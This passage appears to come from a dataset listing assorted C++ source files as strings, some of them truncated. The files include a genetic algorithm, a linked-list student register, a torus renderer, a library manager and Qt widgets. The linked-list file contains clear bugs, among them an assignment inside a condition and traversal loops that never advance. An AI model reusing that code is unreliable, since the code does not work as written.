1.01);\n        child.fitness = fitnessEval(child.x, child.y, child.z);\n    }\n}\n\nstd::vector<Solution> generation(std::vector<Solution> & population)\n{\n    selection(population);\n    std::vector<Solution> newPopulation;\n\n    std::uniform_int_distribution<int> dis(0, population.size() - 1);\n    for (int i = 0; i < population.size(); i += 2)\n    {\n        Solution child = crossover(population[dis(gen)], population[dis(gen)]);\n        mutate(child);\n        newPopulation.push_back(child); // 6. Replacement - Replace the old population with the new population of solutions\n    }\n\n    return newPopulation;\n}\n\nvoid geneticAlgorithm()\n{\n    std::vector<Solution> population(POPULATION_SIZE);\n\n    initPopulation(population);\n    std::sort(population.begin(), population.end(), std::greater<Solution>());\n    std::cout << \"Generation \" << 0 << \" best solution: \" << std::endl << population[0] << std::endl;\n\n    for (int i = 1; i <= MAX_GENERATIONS; ++i)\n    {\n        population = generation(population);\n        std::sort(population.begin(), population.end(), std::greater<Solution>());\n        std::cout << \"Generation \" << i << \" best solution: \" << std::endl << population[0] << std::endl;\n\n        // 7. Termination - Check if termination conditions are met (satisfactory solution found or maximum number of generations reached)\n        if (population[0].fitness > 999)\n        {\n            break;\n        }\n    }\n\n    std::cout << \"foo(x, y, z) = \" << foo(population[0].x, population[0].y, population[0].z);\n\n    int a;\n    std::cin >> a;\n}\n\nint main()\n{\n    geneticAlgorithm();\n    return 0;\n}\n",
    "#include<iostream>\nusing namespace std;\n\nstruct Node\n{\n\tint noMhs;\n\tstring name;\n\tNode* next;\n\tNode* prev;\n};\n \nNode* START = NULL;\n\nvoid addNode()\n{\n    Node *newNode = new Node();\n    cout << \"\\nEnter the roll number of the student : \";\n    cin >> newNode->noMhs;\n    cout << \"\\nEnter the name of the student: \";\n    cin >> newNode->name;\n\n    if (START == NULL || newNode->noMhs <= START ->noMhs)\n    {\n        if (START != NULL && newNode ->noMhs == START->noMhs)\n        {\n            cout << \"\\033[31mDuplicate roll numbers not allowed\\033[0m\" << endl;\n            return;\n        }\n        newNode->next = START;\n        if (START != NULL)\n        {\n            START ->prev = newNode;\n        }\n        newNode->prev = NULL;\n        START = newNode;\n    }\n    else\n    {\n        Node *current = START;\n        Node *previous = NULL;\n\n        while (current != NULL && current->noMhs < newNode->noMhs)\n        {\n            previous = current;\n            current = current -> next;\n        }\n        newNode->next = current;\n        newNode->prev = previous;\n\n        if (current != NULL)\n        {\n            current->prev = newNode;\n        }\n        if (previous != NULL)\n        {\n            previous->next = newNode;\n        }\n        else\n        {\n            START = newNode;\n        }\n    }\n}\n\nbool search(int rollNo, Node **previous, Node **current)\n{\n    *previous = NULL;\n    *current = START;\n\n     while (*current != NULL && (*current)->noMhs != rollNo)\n     {\n        *previous = *current;\n        *current = (*current)->next;\n     }\n     return(*current!= NULL);\n}\n\nvoid deletedNode()\n{\n    Node *previous, *current;\n    int rollNo;\n\n    cout << \"\\nEnter the roll number of the student whose record is to be deleted: \";\n    cin >> rollNo;\n\n    if (START == NULL)\n    {\n        cout << \"List is empty\" << endl;\n        return;\n    }\n    current = START;\n    previous = NULL;\n\n    while (current != NULL && current ->noMhs != rollNo)\n    {\n        previous = current;\n        current = current->next;\n    }\n    if (current == NULL)\n    {\n        cout << \"\\033[31mThe record with roll number\" << rollNo << \"Not found\\033[0m\" << endl;\n        return;\n    }\n    if (current = START)\n    {\n        START = START->next;\n        if (START != NULL)\n        {\n            START->prev = NULL;\n        }\n    }\n    else \n    {\n        previous->next = current->next;\n        if (current->next != NULL)\n        {\n            current->next->prev = previous;\n        }\n    }\n    delete current;\n    cout << \"\\x1b[32mRecord with roll number\" << rollNo << \"Deleted\\x1b[0m\" << endl;\n}\nbool listEmpty()\n{\n    return (START == NULL);\n}\n\nvoid traverse()\n{\n    if (listEmpty())\n    cout << \"\\nList is empty\" << endl;\n    else\n    {\n        cout << \"\\nRecords in ascending order of roll number are: \" << endl;\n        Node *currentNode = START;\n\n        while (currentNode != NULL)\n        {\n            cout << currentNode->noMhs << \" \" << currentNode->name << endl;\n            currentNode == currentNode-> next;\n        }\n    }\n}\n\nvoid revtraverse()\n{\n    if (listEmpty())\n    cout << \"\\nList is empty\" << endl;\n    else\n    {\n        cout << \"\\nRecords in descending order of roll number are : \" << endl;\n        Node *currentNode = START;\n\n        while (currentNode->next != NULL)\n        currentNode = currentNode->next;\n\n        while (currentNode != NULL)\n        {\n            cout << currentNode->noMhs << \" \" << currentNode->name << endl;\n            currentNode = currentNode;\n        }\n    }\n}\n\nvoid searchData()\n{\n    if (listEmpty() == true)\n    {\n        cout << \"\\nList is empty\" << endl;\n    }\n    Node *prev, *curr, prev;\n    prev = curr = NULL;\n    cout << \"\\nEnter the roll number of the student whose record you want to search: \" << endl;\n    int num;\n    cin >> num;\n\n    if (search(num, &prev, &curr)== false)\n    cout << \"nRcord not found\" << endl;\n    else\n    {\n        cout << \"\\nRecord found\" << endl;\n        cout << \"\\nRoll number: \" << curr->noMhs << endl;\n        cout << \"\\nName: \" << curr->name << endl;\n    }\n}\n\nint main()\n{\n    while (true)\n    {\n        try\n        {\n            cout << \"\\nMenu\" << endl;\n            cout << \"1. Add a record to the list \" << endl;\n            cout << \"2. Delete a record from the list\" << endl;\n            cout << \"3. View all records in the ascending order of roll numbers\" << endl;\n            cout << \"4. View all records in descending order of roll numbers\" << endl;\n            cout << \"5. Search for a record in the list\" << endl;\n            cout << \"6. Exit\" << endl;\n            cout << \"\\nEnter your choice (1-6): \";\n            char ch;\n            cin >> ch;\n\n            switch (ch)\n            {\n                case '1' :\n                addNode();\n                break;\n                case '2' :\n                deletedNode();\n                break;\n                case '3' :\n                traverse();\n                break;\n                case '4' :\n                revtraverse();\n                bre",
    "#include <iostream>\n#include <string>\nusing namespace std;\n\n// Definindo uma estrutura para armazenar as informa\u00e7\u00f5es da conta do cliente\nstruct CustomerAccount {\n    string accountNumber;\n    double balance;\n    string lastTransaction;\n};\n\n// Fun\u00e7\u00e3o para obter os dados da conta do cliente\nCustomerAccount getCustomerAccountData() {\n    \n    CustomerAccount account;\n    account.accountNumber = \"123456789\";\n    account.balance = 5000.0;\n    account.lastTransaction = \"Dep\u00f3sito de $1000.00 em 2024-05-05\";\n    return account;\n}\n\n// Fun\u00e7\u00e3o para imprimir os dados da conta do cliente\nvoid printCustomerAccountData(const CustomerAccount& account) {\n    cout << \"\u00daltimas informa\u00e7\u00f5es da conta do cliente:\\n\";\n    cout << \"N\u00famero da conta: \" << account.accountNumber << \"\\n\";\n    cout << \"Saldo: $\" << account.balance << \"\\n\";\n    cout << \"\u00daltima transa\u00e7\u00e3o: \" << account.lastTransaction << \"\\n\";\n}\n\nint main() {\n    // Obtendo os dados da conta do cliente\n    CustomerAccount account = getCustomerAccountData();\n\n    // Exibindo os dados na tela\n    printCustomerAccountData(account);\n\n    return 0;\n}\n",
    "//Copyright (c) 2024 Dominik M. Glogowski\n//\n//Permission is hereby granted, free of charge, to any person obtaining a copy\n//of this software and associated documentation files (the \"Software\"), to deal\n//in the Software without restriction, including without limitation the rights\n//to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n//copies of the Software, and to permit persons to whom the Software is\n//furnished to do so, subject to the following conditions:\n//\n//The above copyright notice and this permission notice shall be included in all\n//copies or substantial portions of the Software.\n//\n//THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n//SOFTWARE.\n\n#include \"ModbusErrorHelper.h\"\n\nnamespace dynamic_modbus_master {\n\n} // dynamic_modbus_master",
    "#define _USE_MATH_DEFINES\r\n\r\n#include <SFML/Graphics.hpp>\r\n#include \"windows.h\" \r\n\r\n\r\nvoid cudathingy(uint8_t* pixels, double pos0, double pos1, double pos2, double vec0, double vec1, double vec2, double addy0, double addy1, double addy2, double addz0, double addz1, double addz2, bool inside, double alpha, double beta, double bigr, double r, bool other, double dx, double dy, double dz, int currx, int curry, int currz, int nbx, int nby, int nbz, bool* blocks1, bool* blocks2, bool rem, bool blockrand, bool reset);\r\nvoid cudaInit();\r\nvoid cudaExit();\r\n\r\ndouble toruscoll2(double a, double b, double c, double d, double e, double f, double m, double n);\r\ndouble solvequartic2(double a0, double b0, double c0, double d0, double e0);\r\nvoid tormat2(double phi, double theta, double* mat);\r\ndouble matdet2(double* m);\r\nvoid matinv2(double* m, double* res);\r\nvoid matmult2(double* m1, double* m2, double* res);\r\nvoid matact2(double* m, double vecn0, double vecn1, double vecn2, double* nvecn);\r\nvoid matflipcpu(double* m, double* res);\r\nvoid matflip2cpu(double* m, double* res);\r\nvoid setblockscpu(bool* blocks1, bool* blocks2);\r\nvoid setblocksrandcpu(bool* blocks1, bool* blocks2);\r\n\r\nstatic bool blocks1[30 * 30 * 30]{};\r\nstatic bool blocks2[30 * 30 * 30]{};\r\n\r\nint main()\r\n{\r\n    ShowWindow(GetConsoleWindow(), SW_HIDE);\r\n\t//ShowWindow(GetConsoleWindow(), SW_SHOW);\r\n\r\n\tdouble r = 1.0;\r\n\tdouble bigr = 1.5;\r\n\r\n\tdouble roomsize = 10.0;\r\n\tdouble schecker = 1.0;\r\n\tdouble dist = 2.0;\r\n\tdouble sqsz = 0.01 / 4;\r\n\tdouble speed = 0.01;\r\n\tdouble alpha = 1.0;\r\n\tdouble beta = 5.0;\r\n\r\n\r\n\tdouble alpha2 = 1.0;\r\n\tdouble beta2 = beta - alpha;\r\n\r\n\r\n\tdouble outangle=0;\r\n\r\n\tbool other = false;\r\n\r\n\tdouble anglex, angley;\r\n\tdouble xl;\r\n\tdouble dotp;\r\n\r\n\tdouble vl, geoang;\r\n\r\n\tdouble tmppos0, tmppos1, tmppos2, tmpx00, tmpx01, tmpx02, tmpx10, tmpx11, tmpx12, tmpx20, tmpx21, tmpx22;\r\n\r\n\tbool inside = false;\r\n\t\r\n\tbool reset = false;\r\n\r\n\r\n    int mousx, mousy, centralx, centraly;\r\n\r\n    double pos0, pos1, pos2;\r\n    double vec0, vec1, vec2;\r\n    double addy0, addy1, addy2;\r\n    double addz0, addz1, addz2;\r\n    double x00, x01, x02;\r\n    double x10, x11, x12;\r\n    double x20, x21, x22;\r\n    double multy = (1 - 1920) * sqsz / 2;\r\n    double multz = (1080-1) * sqsz / 2;\r\n\r\n\r\n    double newx00, newx01, newx02;\r\n    double newx10, newx11, newx12;\r\n    double newx20, newx21, newx22;\r\n\r\n\tdouble torcoll;\r\n\tdouble rayon;\r\n\tdouble newang;\r\n\tdouble guder;\r\n\tdouble distrem;\r\n\r\n\r\n\r\n\tdouble proj0, proj1;\r\n\r\n\tdouble tor0, tor1, tor2, xyvec, theta, phi;\r\n\tdouble mat1[9]{};\r\n\tdouble mat[9]{};\r\n\tdouble nvecn[3]{};\r\n\tdouble inv[9]{};\r\n\tdouble npos[3]{};\r\n\t\r\n\tint nbx = 30;\r\n\tint nby = 30;\r\n\tint nbz = 30;\r\n\r\n\tdouble dx = 2.0*M_PI*bigr / nbx;\r\n\tdouble dy = 2.0 * M_PI * r / nby;\r\n\tdouble dz = (beta - alpha) / nbz;\r\n\tint currx=0, curry=0, currz=0;\r\n\r\n    bool focus = true;\r\n\r\n\tbool blockrand = false;\r\n\tbool tmpinside, tmpother;\r\n\tbool rem = false;\r\n\r\n\r\n\tsetblockscpu(blocks1, blocks2);\r\n\r\n   //sf::RenderWindow window(sf::VideoMode(1920, 1080, 32), \"Torus Minecraft - Press ESC to stop\", sf::Style::Titlebar | sf::Style::Close);\r\n\tsf::RenderWindow window(sf::VideoMode(1920, 1080, 32), \"Torus Minecraft - Press ESC to stop\", sf::Style::Fullscreen);\r\n\tsf::Texture texture;\r\n    sf::Sprite sprite;\r\n    sf::Uint8* pixels = new sf::Uint8[1920 * 1080 * 4];\r\n    sf::Vector2i winpos;\r\n\r\n    cudaInit();\r\n    texture.create(1920, 1080);\r\n    window.setMouseCursorVisible(false);\r\n\r\n\tx00 = 0.0; x01 = 0.0; x02 = -1.0;\r\n\tx10 = 0.0; x11 = 1.0; x12 = 0.0;\r\n\tx20 = 1.0; x21 = 0.0; x22 = 0.0;\r\n\tpos0 = 0.0; pos1 = 0.0; pos2 = 7.93;\r\n\r\n    winpos = window.getPosition();\r\n    SetCursorPos(winpos.x + 1920 / 2, winpos.y + 1080 / 2);\r\n   \r\n    while (window.isOpen())\r\n    {\r\n        //Sleep(1);\r\n        sf::Event event;\r\n\t\t\r\n\t\twhile (window.pollEvent(event))\r\n\t\t{\r\n\t\t\tif (focus && event.type == sf::Event::KeyPressed && event.key.code == sf::Keyboard::J)\r\n\t\t\t{\r\n\t\t\t\tsetblocksrandcpu(blocks1,blocks2);\r\n\t\t\t\tblockrand = true;\r\n\t\t\t}\r\n\r\n\t\t\tif (event.type == sf::Event::Closed)\r\n\t\t\t\twindow.close();\r\n\r\n\t\t\tif (focus && event.type == sf::Event::MouseMoved)\r\n\t\t\t{\r\n\t\t\t\tPOINT p;\r\n\t\t\t\tGetCursorPos(&p);\r\n\t\t\t\twinpos = window.getPosition();\r\n\t\t\t\tcentralx = winpos.x + 1920 / 2;\r\n\t\t\t\tcentraly = winpos.y + 1080 / 2;\r\n\t\t\t\tSetCursorPos(centralx, centraly);\r\n\r\n\t\t\t\tmousx = p.x - centralx;\r\n\t\t\t\tmousy = p.y - centraly;\r\n\r\n\t\t\t\tanglex = 0.002 * mousx;\r\n\t\t\t\tangley = 0.002 * mousy;\r\n\r\n\t\t\t\tif (anglex < 0) anglex *= -1;\r\n\t\t\t\tif (angley < 0) angley *= -1;\r\n\r\n\r\n\t\t\t\tif (mousx > 0)\r\n\t\t\t\t{\r\n\t\t\t\t\tnewx00 = x00 * cos(anglex) + sin(anglex) * x10;\r\n\t\t\t\t\tnewx10 = x10 * cos(anglex) - sin(anglex) * x00;\r\n\t\t\t\t\tx00 = newx00;\r\n\t\t\t\t\tx10 = newx10;\r\n\r\n\t\t\t\t\tnewx01 = x01 * cos(anglex) + sin(anglex) * x11;\r\n\t\t\t\t\tnewx11 = x11 * cos(anglex) - sin(anglex) * x01;\r\n\t\t\t\t\tx01 = newx01;\r\n\t\t\t\t\tx11 = newx11;\r\n\r\n\t\t\t\t\tnewx02 = x02 * cos(anglex) + sin(anglex) * x12;\r\n\t\t\t\t\tnewx12 = x12 * cos(anglex) - sin(anglex) * x02;\r\n\t\t\t\t\tx02 = newx02;\r\n\t\t\t\t\tx12 = newx12;\r\n\t\t\t\t}\r\n\t\t\t\telse if ",
    "\ufeff#include \"chiper.h\"\n\nconst auto chiperMessage = []() -> void {\n\tsystem( \"cls\" );\n\n\tstd::string* enteredMessage = new std::string( \"\" );\n\tstd::string* chiperedMessage = new std::string( \"\" );\n\n\tstd::cout << \"Enter your message: \";\n\tgetline( std::cin, *enteredMessage );\n\n\tconst std::size_t* const enteredMessageSize = new std::size_t( enteredMessage->length() );\n\n\tfor (std::size_t i = 0; i < *enteredMessageSize; i++) {\n\t\tint* symbol = new int( (*enteredMessage)[i] );\n\n\t\t*chiperedMessage += std::to_string( *symbol );\n\n\t\tif (!(i == *enteredMessageSize - 1)) chiperedMessage->push_back( '_' );\n\n\t\tdelete symbol;\n\t}\n\n\tdelete enteredMessageSize;\n\n\tstd::cout << \"Chipered message: \" << *chiperedMessage << std::endl;\n\n\tdelete enteredMessage;\n\tdelete chiperedMessage;\n\n\t_getch();\n};\n\nconst auto unchiperMessage = []() -> void {\n\tsystem( \"cls\" );\n\n\tstd::string* chiperedMessage = new std::string( \"\" );\n\tstd::string* unchiperedMessage = new std::string( \"\" );\n\n\tstd::cout << \"IF YOU DON'T KNOW A CHIPER IT WILL BE A ERROR!!!\" << std::endl;\n\tstd::cout << \"Enter your chipered message: \";\n\tgetline( std::cin, *chiperedMessage );\n\n\tstd::string* delimiter = new std::string(\"_\");\n\tstd::size_t* pos = new std::size_t(0);\n\n\tstd::string* token = new std::string(\"\");\n\n\tstd::vector<std::string>* symbols = new std::vector<std::string>({});\n\n\twhile ((*pos = chiperedMessage->find( *delimiter )) != std::string::npos) {\n\t\t*token = chiperedMessage->substr( 0, *pos );\n\n\t\tsymbols->push_back( *token );\n\n\t\tchiperedMessage->erase( 0, *pos + delimiter->length() );\n\t}\n\n\tsymbols->push_back( *chiperedMessage );\n\n\tdelete delimiter;\n\tdelete pos;\n\tdelete token;\n\n\tfor (std::size_t i = 0; i < symbols->size(); i++) {\n\t\tunchiperedMessage->push_back(static_cast<char>(std::stoi((*symbols)[i])));\n\t}\n\n\tdelete symbols;\n\n\tstd::cout << \"Unchipered message: \" << *unchiperedMessage << std::endl;\n\n\tdelete chiperedMessage;\n\tdelete unchiperedMessage;\n\n\t_getch();\n};\n\n\nint main() {\n\t\n\tstd::cout << \"[c]hiper or [u]nchiper message: \";\n\tint* command = new int(_getch());\n\t\n\tif (static_cast<char>(*command) == 'c') chiperMessage(); \n\tif (static_cast<char>(*command) == 'u') unchiperMessage();\n\tif (!(static_cast<char>(*command) == 'c') && !(static_cast<char>(*command) == 'u')) exit( 505 );\n\n\tdelete command;\n\t\n\treturn 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"latihan_6\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <vector>\n#include <algorithm>\n#include \"easylib.h\"\n\nusing namespace std;\n\nint main() {\n    Library library;\n    library.loadBooksFromFile(); // Load book data on startup\n    library.loadMembersFromFile(); // Load member data on startup\n\n    int choice;\n    do {\n// cout <<\"  _____                         _       _   _      \" << endl; \n// cout <<\" | ____|   __ _   ___   _   _  | |     (_) | |__   \" << endl;\n// cout <<\" |  _|    / _` | / __| | | | | | |     | | | '_ \\  \" << endl; \n// cout <<\" | |___  | (_| | \\__ \\ | |_| | | |___  | | | |_) | \" << endl; \n// cout <<\" |_____|  \\__,_| |___/  \\__, | |_____| |_| |_.__/  \" << endl;  \n// cout <<\"                       |___/                       \" << endl; \n        cout << \"\\nEasyLib - A Library Management System\" << endl;\n        cout << \"1. Add Book\" << endl;\n        cout << \"2. Issue Book\" << endl;\n        cout << \"3. Return Book\" << endl;\n        cout << \"4. Search Books\" << endl;\n        cout << \"5. Display All Books\" << endl;\n        cout << \"6. Add Member\" << endl;\n        cout << \"7. Display All Members\" << endl;\n        cout << \"8. Save Data\" << endl;\n        cout << \"0. Exit\" << endl;\n        cout << \"\\nEnter your choice: \";\n        cin >> choice;\n\n        switch (choice) {\n            case 1: library.addBook(); break;\n            case 2: library.issueBook(); break;\n            case 3: library.returnBook(); break;\n            case 4: library.searchBooks(); break;\n            case 5: library.displayAllBooks(); break;\n            case 6: library.addMember(); break;\n            case 7: library.displayAllMembers(); break;\n            case 8: library.saveBooksToFile(); library.saveMembersToFile(); break;\n            case 0: cout << \"Exiting...\\n\"; break;\n            default: cout << \"Invalid choice!\\n\";\n        }\n    } while (choice != 0);\n\n    return 0;\n}\n\n// Library member function definitions\nvoid Library::addBook() {\n    Book book;\n    cout << \"Enter Book Title: \";\n    cin.ignore(); // Clear input buffer\n    getline(cin, book.title);\n    cout << \"Enter Author: \";\n    getline(cin, book.author);\n    cout << \"Enter ISBN: \";\n    cin >> book.ISBN;\n    book.available = true;\n    books.push_back(book);\n    cout << \"Book added successfully!\\n\";\n}\n\nvoid Library::issueBook() {\n    string ISBN;\n    int memberID;\n    bool foundBook = false;\n\n    cout << \"\\nEnter ISBN of the book to issue: \";\n    cin >> ISBN;\n\n    // Find the book by ISBN\n    for (size_t i = 0; i < books.size(); ++i) {\n        if (books[i].ISBN == ISBN && books[i].available) {\n            foundBook = true;\n\n            cout << \"Enter Member ID: \";\n            cin >> memberID;\n\n            // Find the member by ID and add borrowed book ISBN\n            for (size_t j = 0; j < members.size(); ++j) {\n                if (members[j].memberID == memberID) {\n                    members[j].borrowedBooks.push_back(ISBN);\n                    books[i].available = false;  // Mark book as issued\n                    cout << \"Book issued successfully to \" << members[j].name << \".\" << endl;\n                    return;\n                }\n            }\n            cout << \"Invalid Member ID!\\n\";\n            books[i].available = true; // Revert availability change\n            return;\n        }\n    }\n\n    if (!foundBook) {\n        cout << \"Book not found or unavailable!\\n\";\n    }\n}\n\nvoid Library::returnBook() {\n    string ISBN;\n    int memberID;\n    bool foundBook = false;\n\n    cout << \"Enter ISBN of the book to return: \";\n    cin >> ISBN;\n\n    // Find the book by ISBN\n    for (size_t i = 0; i < books.size(); ++i) {\n        if (books[i].ISBN == ISBN) {\n            foundBook = true;\n            books[i].available = true;   // Mark book as available\n\n            cout << \"Enter Member ID: \";\n            cin >> memberID;\n\n            // Find the member by ID and remove borrowed book ISBN\n            for (size_t j = 0; j < members.size(); ++j) {\n                if (members[j].memberID == memberID) {\n                    vector<string>::iterator it = find(members[j].borrowedBooks.begin(), members[j].borrowedBooks.end(), ISBN);\n                    if (it != members[j].borrowedBooks.end()) {\n                        members[j].borrowedBooks.erase(it);\n                        cout << \"Book returned successfully!\\n\";\n                        return;\n                    } else {\n                        cout << \"Member has not borrowed this book!\\n\";\n                        return;\n                    }\n                }\n            }\n        }\n    }\n\n    if (!foundBook) {\n        cout << \"Book not found!\\n\";\n    }\n}\n\nvoid Library::searchBooks() {\n    string searchTerm;\n    int choice;\n\n    cout << \"Search by:\\n\";\n    cout << \"1. Title\\n\";\n    cout << \"2. Author\\n\";\n    cout << \"3. ISBN\\n\";\n    cout << \"Enter your choice: \";\n    cin >> choice;\n    if (choice > 3 || choice < 1){\n        cout << \"Invalid Choice. Please try again.\" << endl;\n    }\n    else{\n    cin.ignore(); // Cl",
    "#include \"../../include/cppjieba/Jieba.hpp\"\n#include \"Configuration.h\"\n#include \"SplitTool.h\"\n\n// \u5185\u90e8\u7c7b\nclass SplitToolCppJieba::CppJiebaImpl{\npublic:\n    CppJiebaImpl(Configuration * pconf);\n    ~CppJiebaImpl();\n    vector<string> cutWord(const string& sentence);\nprivate:\n    cppjieba::Jieba * _pjieba = nullptr;\n};\n\n// \u5916\u90e8\u7c7b\u51fd\u6570\u5b9e\u73b0\nSplitToolCppJieba::SplitToolCppJieba(Configuration * pconf)\n:_pimpl(new CppJiebaImpl(pconf))\n{}\nSplitToolCppJieba::~SplitToolCppJieba(){\n    if(_pimpl != nullptr){\n        delete _pimpl;\n        _pimpl = nullptr;\n    }\n}\nvector<string> SplitToolCppJieba::cutWord(const string& sentence) {\n    return _pimpl->cutWord(sentence);\n}\n\n// \u5185\u90e8\u7c7b\u51fd\u6570\u5b9e\u73b0\nSplitToolCppJieba::CppJiebaImpl::CppJiebaImpl(Configuration * pconf){\n    // \u83b7\u53d6\u5b57\u5178\n    auto configs = pconf->getConfigMap();\n    const char* const DICT_PATH = configs[\"DICT_PATH\"].c_str();\n    const char* const HMM_PATH = configs[\"HMM_PATH\"].c_str();\n    const char* const USER_DICT_PATH = configs[\"USER_DICT_PATH\"].c_str();\n    /* const char* const IDF_PATH = configs[\"IDF_PATH\"].c_str(); */\n    /* const char* const STOP_WORD_PATH = configs[\"STOP_WORD_PATH\"].c_str(); */\n    // \u521b\u5efajieba\u5bf9\u8c61\n    _pjieba = new cppjieba::Jieba{DICT_PATH,HMM_PATH,USER_DICT_PATH};\n}\nSplitToolCppJieba::CppJiebaImpl::~CppJiebaImpl(){\n    if(_pjieba != nullptr){\n        delete _pjieba;\n        _pjieba = nullptr;\n    }\n}\nvector<string> SplitToolCppJieba::CppJiebaImpl::cutWord(const string& sentence){\n    vector<string> words;\n    _pjieba->Cut(sentence,words,true);\n    return words;\n}\n\n",
    "#include \"add_item_window.h\"\n#include \"qstandardpaths.h\"\n#include \"ui_add_item_window.h\"\n#include <QFileDialog>\n#include <QFile>\n\nAdd_Item_Window::Add_Item_Window(QWidget *parent)\n    : QDialog(parent)\n    , ui(new Ui::Add_Item_Window)\n{\n    ui->setupUi(this);\n    ui->all_fields_label->hide();\n    ui->product_label->hide();\n}\n\n\nvoid Add_Item_Window::on_pushButton_clicked()\n{\n    prod_name = ui->prod_name->text();\n    price = ui->prod_price->value();\n    brand = ui->brand_name->text();\n    stock = ui->stock_count->value();\n    category = ui->category->currentText(); \n\n    if (prod_name.isEmpty() || price == 0 || brand.isEmpty() || stock == 0 || category == \"---\") {\n        ui->all_fields_label->show();\n    } else {\n        // Get the desktop directory path\n        QString desktopDir = QStandardPaths::writableLocation(QStandardPaths::DesktopLocation);\n\n        // Create the full file path\n        QString filePath = desktopDir + \"/products.txt\";\n\n        // Open the file to count the number of lines\n        QFile countFile(filePath);\n        if (countFile.open(QIODevice::ReadOnly | QIODevice::Text)) {\n            int lineCount = 0;\n            QTextStream countStream(&countFile);\n            while (!countStream.atEnd()) {\n                countStream.readLine();\n                lineCount++;\n            }\n            countFile.close();\n\n            // Open the file to append the new line with incremented ID\n            QFile file(filePath);\n            if (file.open(QIODevice::Append | QIODevice::Text)) {\n                QTextStream out(&file);\n                out << prod_name << \",\" << price << \",\" << brand << \",\" << stock << \",\" << category << \",\" << lineCount << \"\\n\";\n                file.close();\n                hide();\n            } else {\n                qDebug() << \"Failed to open products.txt for appending:\" << file.errorString();\n            }\n        } else {\n            qDebug() << \"Failed to open products.txt for counting lines:\" << countFile.errorString();\n        }\n    }\n\n}\n\n\n\n\nAdd_Item_Window::~Add_Item_Window()\n{\n    delete ui;\n}\n\n\n\n",
    "#include \"ArrayBlock.hpp\"\r\n\r\n#include <QPainter>\r\n\r\n\r\nArrayBlock::ArrayBlock(int maxValue, const QSizeF& elementSize, qreal spacing) :\r\n\tArrayBlock(QStringLiteral(\"\"), 0, maxValue, elementSize, spacing)\r\n{\r\n\r\n}\r\n\r\nArrayBlock::ArrayBlock(int index, int value, int elementCount, const QSizeF& elementSize, qreal spacing) :\r\n\tArrayBlock(QString::number(index), value, elementCount, elementSize, spacing)\r\n{\r\n\r\n}\r\n\r\nArrayBlock::ArrayBlock(const QString& Index, int value, int maxValue, const QSizeF& elementSize, qreal spacing) :\r\n\tmIndex{Index},\r\n\tmMaxValue{maxValue},\r\n\tmElementSize{elementSize},\r\n\tmSpacing{spacing},\r\n\tmPen{Qt::green},\r\n\tmBrush{Qt::green},\r\n\tmColored{true}\r\n{\r\n\tconstexpr auto topMargin = 60.0;\r\n\r\n\tmSize.setWidth(mElementSize.width());\r\n\tmSize.setHeight(mElementSize.height() * mMaxValue + mSpacing * (mMaxValue - 1) + topMargin);\r\n\r\n\tmPen.setStyle(Qt::DotLine);\r\n\r\n\tmIndex.setTextWidth(mElementSize.width());\r\n\tmIndex.setTextOption(QTextOption(Qt::AlignCenter));\r\n\r\n\tsetValue(value);\r\n}\r\n\r\nvoid ArrayBlock::setValue(int value)\r\n{\r\n\tif(value > -1 && value <= mMaxValue)\r\n\t\tmValue = value;\r\n}\r\n\r\nvoid ArrayBlock::setIndex(const QString& index)\r\n{\r\n\tmIndex.setText(index);\r\n}\r\n\r\nvoid ArrayBlock::setIndex(int index)\r\n{\r\n\tsetIndex(QString::number(index));\r\n}\r\n\r\nvoid ArrayBlock::setColored(bool colored)\r\n{\r\n\tmColored = colored;\r\n}\r\n\r\nvoid ArrayBlock::reset()\r\n{\r\n\tsetElementFrameColor(Qt::green);\r\n\tsetElementColor(Qt::green);\r\n\tsetValue(0);\r\n\r\n\tmColored = true;\r\n}\r\n\r\nvoid ArrayBlock::update()\r\n{\r\n\tQGraphicsItem::update(boundingRect());\r\n}\r\n\r\nint ArrayBlock::getValue() const\r\n{\r\n\treturn mValue;\r\n}\r\n\r\nbool ArrayBlock::isColored() const\r\n{\r\n\treturn mColored;\r\n}\r\n\r\nQRectF ArrayBlock::boundingRect() const\r\n{\r\n\treturn QRectF(QPointF(), mSize);\r\n}\r\n\r\nvoid ArrayBlock::setElementFrameColor(const QColor& color, Qt::PenStyle style)\r\n{\r\n\tmPen.setColor(color);\r\n\tmPen.setStyle(style);\r\n}\r\n\r\nvoid ArrayBlock::setElementColor(const QColor& color)\r\n{\r\n\tmBrush.setColor(color);\r\n}\r\n\r\nvoid ArrayBlock::paint(QPainter* painter, const QStyleOptionGraphicsItem* /*option*/, QWidget* /*widget*/)\r\n{\r\n\tconst QPen notColoredPenColor{Qt::transparent};\r\n\tconst QBrush 